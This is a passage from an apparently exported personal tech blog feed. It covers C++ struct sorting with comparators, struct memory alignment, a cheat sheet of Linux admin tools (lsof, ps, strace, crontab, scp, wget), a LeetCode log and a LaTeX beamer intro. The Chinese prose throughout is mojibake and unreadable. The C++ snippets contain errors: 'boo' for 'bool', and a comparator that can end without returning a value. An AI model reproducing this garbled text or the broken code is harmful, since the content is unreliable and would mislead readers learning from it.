ç§æ–¹æ³•"></a>ç»“æ„ä½“æ’åºçš„å‡ ç§æ–¹æ³•</h1><h2 id="é€šè¿‡é‡è½½-lt-æ“ä½œç¬¦"><a href="#é€šè¿‡é‡è½½-lt-æ“ä½œç¬¦" class="headerlink" title="é€šè¿‡é‡è½½ &lt; æ“ä½œç¬¦"></a>é€šè¿‡é‡è½½ &lt; æ“ä½œç¬¦</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> math;<br>    <span class="hljs-keyword">int</span> chinese;<br>    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span> &lt; (<span class="hljs-keyword">const</span> node &amp;a) <span class="hljs-keyword">const</span><br>    &#123;   <br>    <span class="hljs-keyword">return</span> math&lt;a.math;<span class="hljs-comment">//mathä»å°åˆ°å¤§è¿›è¡Œæ’åº</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="è‡ªå®šä¹‰sortçš„cmpå‡½æ•°"><a href="#è‡ªå®šä¹‰sortçš„cmpå‡½æ•°" class="headerlink" title="è‡ªå®šä¹‰sortçš„cmpå‡½æ•°"></a>è‡ªå®šä¹‰sortçš„cmpå‡½æ•°</h2><p>å¯¹äºä¸€ä¸ªç»“æ„ä½“è€Œè¨€ï¼Œæœ‰å¤šä¸ªå…³é”®å­—ï¼Œåœ¨ä½¿ç”¨sortçš„æ—¶å€™å¯ä»¥é’ˆå¯¹ä¸åŒå…³é”®å­—è¿›è¡Œæ’åº<br>æ¯”å¦‚ä¸‹é¢è¿™ä¸ªç»“æ„ä½“nodeå­˜å‚¨æ•°å­¦å’Œè¯­æ–‡æˆç»©</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> math;<br><span class="hljs-keyword">int</span> chinese;<br>&#125;node[N];<br></code></pre></td></tr></table></figure><p><strong>ä»…ä»…ä»¥mathä¸ºå…³é”®å­—è¿›è¡Œæ’åº</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">boo <span class="hljs-title">cmp</span><span class="hljs-params">(node a,node b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> a.math&lt;b.math;<span class="hljs-comment">//æŒ‰ç…§æ•°å­¦æˆç»©ä»å°åˆ°å¤§è¿›è¡Œæ’åº</span><br>&#125;<br><span class="hljs-built_in">sort</span>(a,a+n,cmp);<br></code></pre></td></tr></table></figure><p><strong>ä¼˜å…ˆä»¥mathä¸ºå…³é”®å­—æ’åºï¼Œå½“mathç›¸ç­‰æ—¶ï¼Œä»¥Chineseä¸ºå…³é”®å­—æ’åº</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">boo <span class="hljs-title">cmp</span><span class="hljs-params">(node a,node b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(a.math!=b.math) <span class="hljs-keyword">return</span> a.math&lt;b.math;<br><span class="hljs-keyword">if</span>(a.chinese!=b.chinese) <span class="hljs-keyword">return</span> a.chinese&lt;b.chinese;<br>&#125;<br><span class="hljs-built_in">sort</span>(a,a+n,cmp);<br></code></pre></td></tr></table></figure><h1 id="ç»“æ„ä½“å¯¹é½"><a href="#ç»“æ„ä½“å¯¹é½" class="headerlink" title="ç»“æ„ä½“å¯¹é½"></a>ç»“æ„ä½“å¯¹é½</h1><ul><li>åŸåˆ™ä¸€:æ•°æ®æˆå‘˜å¯¹é½è§„åˆ™:<ul><li>ç»“æ„çš„æ•°æ®æˆå‘˜ï¼Œç¬¬ä¸€ä¸ªæ•°æ®æˆå‘˜æ”¾åœ¨offsetä¸º0çš„åœ°æ–¹</li><li>ä»¥åæ¯ä¸ªæ•°æ®æˆå‘˜å­˜å‚¨çš„èµ·å§‹ä½ç½®è¦ä»è¯¥æˆå‘˜å¤§å°çš„æ•´æ•°å€å¼€å§‹(æ¯”å¦‚intåœ¨32ä½æœºä¸º4å­—èŠ‚ï¼Œåˆ™è¦ä»4çš„æ•´æ•°å€åœ°å€å¼€å§‹å­˜å‚¨)</li></ul></li><li>åŸåˆ™äºŒ:ç»“æ„ä½“çš„æ€»å¤§å°ï¼Œä¹Ÿå°±æ˜¯sizeofçš„ç»“æœï¼Œå¿…é¡»æ˜¯å…¶å†…éƒ¨æœ€å¤§æˆå‘˜çš„æ•´æ•°å€ï¼Œä¸è¶³çš„è¦è¡¥é½</li><li>åŸåˆ™ä¸‰:å¦‚æœä¸€ä¸ªç»“æ„é‡Œæœ‰æŸäº›ç»“æ„ä½“æˆå‘˜ï¼Œåˆ™ç»“æ„ä½“æˆå‘˜è¦ä»å…¶å†…éƒ¨æœ€å¤§å…ƒç´ å¤§å°çš„æ•´æ•°å€åœ°å€å¼€å§‹å­˜å‚¨<ul><li>struct aé‡Œå­˜æœ‰struct bï¼Œbé‡Œæœ‰charï¼Œintï¼Œ doubleç­‰å…ƒç´ ï¼Œ é‚£båº”è¯¥ä»8çš„æ•´æ•°å€å¼€å§‹å­˜å‚¨. </li></ul></li><li>åŸåˆ™å››:å¯¹é½å‚æ•°å¦‚æœæ¯”ç»“æ„ä½“æˆå‘˜çš„sizeofå€¼å°ï¼Œè¯¥æˆå‘˜çš„åç§»é‡åº”è¯¥ä»¥æ­¤å€¼ä¸ºå‡†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç»“æ„ä½“æˆå‘˜çš„åç§»é‡åº”è¯¥å–äºŒè€…çš„æœ€å°å€¼<ul><li>å¯¹é½å‚æ•°å°±æ˜¯#pragma pack(num)ä¸­çš„numå€¼</li></ul></li></ul><p><img src="/image/image-20230313175216749.png" alt="image-20230313175216749"></p>]]></content>
    
    
    <categories>
      
      <category>Cè¯­è¨€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cè¯­è¨€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linuxè¿ç»´å¸¸ç”¨å·¥å…·</title>
    <link href="/p/8329f3e9/"/>
    <url>/p/8329f3e9/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/gnulinux.png"></p><h1 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h1><p><a href="https://gls.show/p/66ee2080/">gdbè°ƒè¯•ï¼šä¸€ä¸ªç®€å•çš„å…¥é—¨</a></p><h1 id="ldd"><a href="#ldd" class="headerlink" title="ldd"></a>ldd</h1><ul><li>æŸ¥çœ‹ç¨‹åºè¿è¡Œæ‰€éœ€çš„å…±äº«åº“ï¼ˆ.soæ–‡ä»¶ï¼‰,å¸¸ç”¨æ¥è§£å†³å› ç¼ºå°‘æŸä¸ªåº“æ–‡ä»¶è€Œä¸èƒ½è¿è¡Œçš„é—®é¢˜</li><li>ä½¿ç”¨æ–¹å¼ï¼šldd + æ–‡ä»¶å</li><li>è¾“å‡ºä¸‰åˆ—ï¼Œåˆ†åˆ«æ˜¯ä¾èµ–çš„åº“ã€åº“çš„ä½ç½®ã€åº“åŠ è½½çš„èµ·å§‹åœ°å€</li></ul><h1 id="top"><a href="#top" class="headerlink" title="top"></a>top</h1><p>å®æ—¶æ˜¾ç¤ºç³»ç»Ÿä¸­å„ä¸ªè¿›ç¨‹çš„èµ„æºå ç”¨çŠ¶å†µ</p><p>äº¤äº’æŒ‡ä»¤ï¼š</p><ul><li>iï¼šåªæ˜¾ç¤ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</li><li>hï¼šå¸®åŠ©å‘½ä»¤</li><li>qï¼šé€€å‡º</li><li>uï¼šæŒ‡å®šæ˜¾ç¤ºç”¨æˆ·è¿›ç¨‹</li><li>Pï¼šæŒ‰%CPUä½¿ç”¨ç‡æ’è¡Œ</li><li>Tï¼šæŒ‰MITE+æ’è¡Œ</li><li>Mï¼šæŒ‰%MEMæ’è¡Œ</li><li>cï¼šæ˜¾ç¤ºå‘½ä»¤å®Œå…¨æ¨¡å¼</li><li>sï¼šè®¾ç½®åˆ·æ–°æ—¶é—´é—´éš”</li><li>æŒ‰é”®ç›˜æ•°å­—â€œ1â€ï¼Œå¯ç›‘æ§æ¯ä¸ªé€»è¾‘CPUçš„çŠ¶å†µ</li></ul><p>ä¸€äº›ç¼©å†™ï¼š</p><ul><li>PIDï¼šè¿›ç¨‹çš„ID</li><li>USERï¼šè¿›ç¨‹æ‰€æœ‰è€…</li><li>PRï¼šè¿›ç¨‹çš„ä¼˜å…ˆçº§åˆ«ï¼Œè¶Šå°è¶Šä¼˜å…ˆè¢«æ‰§è¡Œ</li><li>VIRTï¼šè¿›ç¨‹å ç”¨çš„è™šæ‹Ÿå†…å­˜</li><li>RESï¼šè¿›ç¨‹å ç”¨çš„ç‰©ç†å†…å­˜</li><li>SHRï¼šè¿›ç¨‹ä½¿ç”¨çš„å…±äº«å†…å­˜</li><li>%CPUï¼šè¿›ç¨‹å ç”¨CPUçš„ä½¿ç”¨ç‡</li><li>%MEMï¼šè¿›ç¨‹ä½¿ç”¨çš„ç‰©ç†å†…å­˜å’Œæ€»å†…å­˜çš„ç™¾åˆ†æ¯”</li><li>TIME+ï¼šè¯¥è¿›ç¨‹å¯åŠ¨åå ç”¨çš„æ€»çš„CPUæ—¶é—´ï¼Œå³å ç”¨CPUä½¿ç”¨æ—¶é—´çš„ç´¯åŠ å€¼</li><li>COMMANDï¼šè¿›ç¨‹å¯åŠ¨å‘½ä»¤åç§°</li></ul><p>cpuï¼š</p><ul><li>us ç”¨æˆ·ç©ºé—´å ç”¨CPUç™¾åˆ†æ¯”</li><li>sy å†…æ ¸ç©ºé—´å ç”¨CPUç™¾åˆ†æ¯”</li><li>ni ç”¨æˆ·è¿›ç¨‹ç©ºé—´å†…æ”¹å˜è¿‡ä¼˜å…ˆçº§çš„è¿›ç¨‹å ç”¨CPUç™¾åˆ†æ¯”</li><li>id ç©ºé—²CPUç™¾åˆ†æ¯”</li><li>wa ç­‰å¾…è¾“å…¥è¾“å‡ºçš„CPUæ—¶é—´ç™¾åˆ†æ¯”</li><li>hi ç¡¬ä»¶ä¸­æ–­</li><li>si è½¯ä»¶ä¸­æ–­ </li></ul><h1 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h1><blockquote><p>lsofï¼ˆlist open filesï¼‰<br>é€šè¿‡æ–‡ä»¶ä¸ä»…ä»…å¯ä»¥è®¿é—®å¸¸è§„æ•°æ®ï¼Œè¿˜å¯ä»¥è®¿é—®ç½‘ç»œè¿æ¥å’Œç¡¬ä»¶ã€‚å¦‚ä¼ è¾“æ§åˆ¶åè®® (TCP) å’Œç”¨æˆ·æ•°æ®æŠ¥åè®® (UDP) å¥—æ¥å­—ç­‰</p></blockquote><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Lists <span class="hljs-keyword">open</span> files <span class="hljs-keyword">and</span> the corresponding processes.<br> <span class="hljs-literal">Note</span>: Root privileges (<span class="hljs-keyword">or</span> sudo) <span class="hljs-keyword">is</span> required <span class="hljs-keyword">to</span> list files opened by <span class="hljs-keyword">others</span>.<br> More information: https://manned.org/lsof.<br><br> - Find the processes that have a given <span class="hljs-keyword">file</span> <span class="hljs-keyword">open</span>:<br>   lsof path/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">file</span><br><br> - Find the <span class="hljs-keyword">process</span> that opened a local internet <span class="hljs-keyword">port</span>:<br>   lsof -i :<span class="hljs-keyword">port</span><br><br> - Only output the <span class="hljs-keyword">process</span> ID (PID):<br>   lsof -t path/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">file</span><br><br> - List files opened by the given user:<br>   lsof -u username<br><br> - List files opened by the given command <span class="hljs-keyword">or</span> <span class="hljs-keyword">process</span>:<br>   lsof -c process_or_command_name<br><br> - List files opened by a specific <span class="hljs-keyword">process</span>, given its PID:<br>   lsof -p PID<br><br> - List <span class="hljs-keyword">open</span> files <span class="hljs-keyword">in</span> a directory:<br>   lsof +D path/<span class="hljs-keyword">to</span>/directory<br><br> - Find the <span class="hljs-keyword">process</span> that <span class="hljs-keyword">is</span> listening <span class="hljs-keyword">on</span> a local IPv6 TCP <span class="hljs-keyword">port</span> <span class="hljs-keyword">and</span> don<span class="hljs-symbol">&#x27;t</span> convert network <span class="hljs-keyword">or</span> <span class="hljs-keyword">port</span> numbers:<br>   lsof -i6TCP:<span class="hljs-keyword">port</span> -sTCP:LISTEN -n -P<br></code></pre></td></tr></table></figure><h1 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h1><p>æŸ¥çœ‹è¿›ç¨‹</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs vim"><br><span class="hljs-keyword">ps</span><br><br>Information about running processes.<br>More information: http<span class="hljs-variable">s:</span>//manned.org/<span class="hljs-keyword">ps</span>.<br><br>- List <span class="hljs-keyword">all</span> running processe<span class="hljs-variable">s:</span><br>  <span class="hljs-keyword">ps</span> aux<br><br>- List <span class="hljs-keyword">all</span> running processes including the full <span class="hljs-keyword">command</span> strin<span class="hljs-variable">g:</span><br>  <span class="hljs-keyword">ps</span> auxww<br><br>- Search <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> process that matches <span class="hljs-keyword">a</span> strin<span class="hljs-variable">g:</span><br>  <span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> <span class="hljs-built_in">string</span><br><br>- List <span class="hljs-keyword">all</span> processes of the current user in extra full forma<span class="hljs-variable">t:</span><br>  <span class="hljs-keyword">ps</span> --user $(id -<span class="hljs-keyword">u</span>) -F<br><br>- List <span class="hljs-keyword">all</span> processes of the current user <span class="hljs-keyword">as</span> <span class="hljs-keyword">a</span> tree:<br>  <span class="hljs-keyword">ps</span> --user $(id -<span class="hljs-keyword">u</span>) <span class="hljs-keyword">f</span><br><br>- Get the parent PID of <span class="hljs-keyword">a</span> proces<span class="hljs-variable">s:</span><br>  <span class="hljs-keyword">ps</span> -<span class="hljs-keyword">o</span> ppid= -<span class="hljs-keyword">p</span> pid<br><br>- Sort processes by memory consumption:<br>  <span class="hljs-keyword">ps</span> --<span class="hljs-keyword">sort</span> size<br></code></pre></td></tr></table></figure><h1 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h1><ul><li>æ˜¾ç¤ºæ¯ä¸ªè¿›ç¨‹çš„æ ˆè·Ÿè¸ª</li><li>é€šè¿‡sudo apt install pstackè¿›è¡Œå®‰è£…</li></ul><h1 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h1><p>è¿½è¸ªç³»ç»Ÿè°ƒç”¨</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><br>- Start tracing <span class="hljs-keyword">a</span> specific <span class="hljs-built_in">process</span> <span class="hljs-keyword">by</span> its PID:<br>  strace -p pid<br><br>- Trace <span class="hljs-keyword">a</span> <span class="hljs-built_in">process</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">filter</span> output <span class="hljs-keyword">by</span> <span class="hljs-keyword">system</span> call:<br>  strace -p pid -e system_call_name<br><br>- Count <span class="hljs-built_in">time</span>, calls, <span class="hljs-keyword">and</span> errors <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">system</span> call <span class="hljs-keyword">and</span> report <span class="hljs-keyword">a</span> summary <span class="hljs-keyword">on</span> <span class="hljs-title">program</span> <span class="hljs-title">exit</span>:<br>  strace -p pid -c<br><br>- Show <span class="hljs-keyword">the</span> <span class="hljs-built_in">time</span> spent <span class="hljs-keyword">in</span> every <span class="hljs-keyword">system</span> call:<br>  strace -p pid -T<br><br>- Start tracing <span class="hljs-keyword">a</span> program <span class="hljs-keyword">by</span> executing <span class="hljs-keyword">it</span>:<br>  strace program<br><br>- Start tracing <span class="hljs-built_in">file</span> operations <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> program:<br>  strace -e trace=<span class="hljs-built_in">file</span> program<br></code></pre></td></tr></table></figure><h1 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h1><ul><li>ELF(Executable and Linking Format)</li><li>elfæ–‡ä»¶çš„å‡ ç§ç±»å‹<ul><li>å¯é‡å®šä½çš„å¯¹è±¡æ–‡ä»¶(Relocatable file)ï¼Œæ¯”å¦‚ç”±æ±‡ç¼–å™¨æ±‡ç¼–ç”Ÿæˆçš„ .o æ–‡ä»¶</li><li>å¯æ‰§è¡Œçš„å¯¹è±¡æ–‡ä»¶(Executable file)</li><li>åŠ¨æ€åº“æ–‡ä»¶ï¼Œ.soæ–‡ä»¶(Shared object file)</li></ul></li></ul><p>readelfæŒ‡ä»¤çš„å‡ ä¸ªå¸¸ç”¨é€‰é¡¹ï¼š</p><ul><li>-aåˆ—å‡ºå…¨éƒ¨</li><li>-håˆ—å‡ºæ–‡ä»¶å¤´</li><li>-Såˆ—å‡ºæ®µå¤´</li><li>-sç¬¦å·è¡¨</li></ul><h1 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h1><ul><li>ç›´æ¥è¾“å…¥objdumpå¯ä»¥æ˜¾ç¤ºæŒ‡ä»¤é€‰é¡¹ï¼ŒmanæŒ‡ä»¤å¯ä»¥æ›´è¯¦ç»†ä¸€äº›</li><li>-S å°½å¯èƒ½åæ±‡ç¼–å‡ºæºä»£ç ï¼Œå°¤å…¶å½“ç¼–è¯‘çš„æ—¶å€™æŒ‡å®šäº†-gè¿™ç§è°ƒè¯•å‚æ•°æ—¶ï¼Œæ•ˆæœæ¯”è¾ƒæ˜æ˜¾ã€‚éšå«äº†-då‚æ•°</li><li>-d åæ±‡ç¼–</li><li>-f æ˜¾ç¤ºæ–‡ä»¶å¤´ä¿¡æ¯<h1 id="nm"><a href="#nm" class="headerlink" title="nm"></a>nm</h1>nm å‘½ä»¤æ˜¾ç¤ºå…³äºæŒ‡å®š File ä¸­ç¬¦å·çš„ä¿¡æ¯<h1 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h1></li><li>wget [å‚æ•°] [URLåœ°å€]</li><li>wegt url ä»ç½‘ç»œä¸‹è½½ä¸€ä¸ªæ–‡ä»¶å¹¶ä¿å­˜åœ¨å½“å‰ç›®å½•</li><li>-Oé€‰é¡¹å¯ä»¥æŒ‡å®šæ–‡ä»¶å</li><li>-cé‡æ–°å¯åŠ¨ä¸‹è½½ä¸­æ–­çš„æ–‡ä»¶</li><li>-båå°ä¸‹è½½</li></ul><h1 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h1><p>secure copyï¼Œä»è¿œç¨‹ä¸»æœºå¤„å¤åˆ¶<br>å¸¸ç”¨å‘½ä»¤ï¼š</p><ul><li>-r é€’å½’å¤åˆ¶æ•´ä¸ªç›®å½•</li><li><code>scp path/to/local_file emote_username@remote_host:path/to/remote_directory</code></li><li><code>scp -i ~/.ssh/private_key local_file remote_host:/path/remote_file</code></li></ul><h1 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h1><p>å®šæ—¶ä»»åŠ¡</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">crontab<br><br>Schedule cron jobs <span class="hljs-built_in">to</span> run <span class="hljs-keyword">on</span> <span class="hljs-title">a</span> <span class="hljs-title">time</span> <span class="hljs-title">interval</span> <span class="hljs-title">for</span> <span class="hljs-title">the</span> <span class="hljs-title">current</span> <span class="hljs-title">user</span>.<br>Job definition <span class="hljs-built_in">format</span>: <span class="hljs-string">&quot;(min) (hour) (day_of_month) (month) (day_of_week) command_to_execute&quot;</span>.<br>More information: <span class="hljs-keyword">https</span>://manned.org/crontab.<br><br>- Edit <span class="hljs-keyword">the</span> crontab <span class="hljs-built_in">file</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> current user:<br>  crontab -e<br><br>- Edit <span class="hljs-keyword">the</span> crontab <span class="hljs-built_in">file</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> specific user:<br>  sudo crontab -e -u user<br><br>- Replace <span class="hljs-keyword">the</span> current crontab <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> contents <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> given <span class="hljs-built_in">file</span>:<br>  crontab path/<span class="hljs-built_in">to</span>/<span class="hljs-built_in">file</span><br><br>- View <span class="hljs-keyword">a</span> list <span class="hljs-keyword">of</span> existing cron jobs <span class="hljs-keyword">for</span> current user:<br>  crontab -l<br><br>- Remove all cron jobs <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> current user:<br>  crontab -r<br><br>- Sample job which runs <span class="hljs-keyword">at</span> <span class="hljs-number">10</span>:<span class="hljs-number">00</span> every day (* means <span class="hljs-keyword">any</span> <span class="hljs-built_in">value</span>):<br>  <span class="hljs-number">0</span> <span class="hljs-number">10</span> * * * command_to_execute<br><br>- Sample job which runs every minute <span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">3rd</span> <span class="hljs-title">of</span> <span class="hljs-title">April</span>:<br>  * * <span class="hljs-number">3</span> Apr * command_to_execute<br><br>- Sample job which runs <span class="hljs-keyword">a</span> certain script <span class="hljs-keyword">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">30</span> every Friday:<br>  <span class="hljs-number">30</span> <span class="hljs-number">2</span> * * Fri /absolute/path/<span class="hljs-built_in">to</span>/script.sh<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPPï¼šé“¾æ¥</title>
    <link href="/p/e9b29492/"/>
    <url>/p/e9b29492/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿï¼Œcsapp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>leetcodeæ—¥å¸¸</title>
    <link href="/p/4d5648c6/"/>
    <url>/p/4d5648c6/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç”±äºæœ€è¿‘å®åœ¨æ˜¯å¤ªé—²äº†ï¼Œå› æ­¤åˆ¶å®šäº†è¯¥è®¡åˆ’ï¼Œæ¯å¤©ä¸Šç­åšä¸€é¢˜leetcodeï¼Œä¹‹åå‘å¸ƒé¢˜è§£ï¼Œç„¶åå†å¼€å§‹å·¥ä½œ</p><p>åˆ·é¢˜é¡ºåºä¸€å®šç¨‹åº¦ä¸Šå‚ç…§<a href="https://codetop.cc/home">å¤§å‚é¢è¯•é¢‘ç‡</a>ï¼Œç”±é«˜åˆ°ä½ä¾æ¬¡è¿›è¡Œ</p><h1 id="å¤§å‚ç®—æ³•hot100é¢˜æŒç»­æ›´æ–°"><a href="#å¤§å‚ç®—æ³•hot100é¢˜æŒç»­æ›´æ–°" class="headerlink" title="å¤§å‚ç®—æ³•hot100é¢˜æŒç»­æ›´æ–°"></a>å¤§å‚ç®—æ³•hot100é¢˜æŒç»­æ›´æ–°</h1><table><thead><tr><th>åŸé¢˜</th><th>æ—¶é—´</th><th>ç®—æ³•æ ‡ç­¾</th></tr></thead><tbody><tr><td><a href="https://leetcode.cn/problems/candy/submissions/">åˆ†å‘ç³–æœ</a></td><td>2022-6-2</td><td>è´ªå¿ƒ</td></tr><tr><td><a href="https://leetcode.cn/problems/assign-cookies/">åˆ†å‘é¥¼å¹²</a></td><td>2022-6-2</td><td>è´ªå¿ƒ</td></tr><tr><td></td><td></td><td></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>leetcode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>leetcode</tag>
      
      <tag>ä¼‘é—²</tag>
      
      <tag>ç®—æ³•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>beameråˆ¶ä½œslides</title>
    <link href="/p/6c3f01d9/"/>
    <url>/p/6c3f01d9/</url>
    
    <content type="html"><![CDATA[<h1 id="beamerç®€ä»‹"><a href="#beamerç®€ä»‹" class="headerlink" title="beamerç®€ä»‹"></a>beamerç®€ä»‹</h1><p>beameræ˜¯LaTeX documentclassçš„ä¸€ç§ï¼Œé€‚åˆåˆ¶ä½œå­¦æœ¯é£æ ¼PPTï¼Œå…³äºLaTeXçš„ä»‹ç»å¯ä»¥å‚è€ƒ<a href="https://gls.show/p/cc09e53b/">æˆ‘çš„å¦ä¸€ç¯‡åšå®¢</a></p><p>ä¸‹é¢æ˜¯beamerçš„ä¸€ä¸ªé¢„è§ˆå›¾ï¼Œå¯ä»¥çœ‹åˆ°è¿˜æ˜¯å¾ˆç®€æ´ç¾è§‚çš„</p><p><img src="/image/Beamer-titlepageUpdated.png"></p><h1 id="ä¸€ä¸ªå¿«é€Ÿå…¥é—¨é€”å¾„"><a href="#ä¸€ä¸ªå¿«é€Ÿå…¥é—¨é€”å¾„" class="headerlink" title="ä¸€ä¸ªå¿«é€Ÿå…¥é—¨é€”å¾„"></a>ä¸€ä¸ªå¿«é€Ÿå…¥é—¨é€”å¾„</h1><ul><li><p>åœ¨GitHubä¸Šæ‰¾ä¸€ä¸ª<a href="https://github.com/SunYanCN/Latex-Beamer-Template">æ¨¡æ¿</a></p></li><li><p>åšå¡«ç©ºé¢˜å³å¯</p><ul><li>æŠŠäººåã€æ ‡é¢˜ç­‰ç›¸å…³æ›¿æ¢æ‰</li><li>äº†è§£ä¸€äº›beamerçš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•</li></ul></li></ul><h1 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h1><ul><li>é¦–è¡Œæ˜¯\documentclass[11pt]{beamer}è¡¨ç¤ºå­—ä½“å¤§å°å’Œä½¿ç”¨beamerç±»</li><li>åé¢æ˜¯\usepakageè¡¨ç¤ºè°ƒç”¨çš„å®åŒ…</li><li>\begin{document}è¡¨ç¤ºæ–‡æ¡£çš„å¼€å§‹</li><li>\kaishuè¡¨ç¤ºå­—ä½“ä¸ºæ¥·ä¹¦</li><li>\begin{frame}è¡¨ç¤ºå•ç‹¬ä¸€é¡µ</li><li>å¤§å°å…³ç³»ï¼šsection &gt; subsection &gt; frame &gt; item </li></ul><h1 